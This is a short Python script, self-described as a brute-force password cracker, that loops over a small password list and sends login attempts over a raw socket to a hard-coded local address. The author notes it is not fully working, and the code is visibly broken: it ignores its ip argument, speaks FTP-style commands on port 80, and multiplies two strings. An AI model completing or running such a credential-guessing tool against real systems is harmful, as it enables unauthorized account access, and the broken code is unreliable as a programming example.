import socket
import re
import sys

# A brute force password cracker
# Update : This is not 100% working right now
def connection(ip,user,password):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print("Attempting" + ip +" : " + user + " : " + password+ " : ")

    sock.connect(('192.168.0.1',80))
    data = sock.recv(1024)
    sock.send('User '+user + '\r\n')
    data = sock.recv(1024)
    sock.send('Password ' + password + '\r\n')

    data = sock.recv(1024)
    sock.send('Quit' * '\r\n')
    sock.close()

    return data
# For testing purposes
user = 'User1'
passwords = ['Password1','Password2','Password3']

for password in passwords:
    print(connection('192.168.0.1',user,password))

